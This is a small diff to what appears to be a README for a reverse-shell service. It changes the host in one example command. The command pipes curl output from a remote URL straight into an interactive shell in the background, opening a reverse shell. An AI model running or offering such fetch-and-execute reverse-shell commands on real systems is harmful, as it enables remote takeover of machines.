@@ -76,7 +76,7 @@ The following command will run the reverse shell in a background process and exi
 Make sure you run this in a fresh terminal window otherwise you'll lose any work in your existing session.
 
 ```shell
-sh -c "curl https://shell.now.sh/localhost:1337 | sh -i &" && exit
+sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit
 ```
 
 ## License
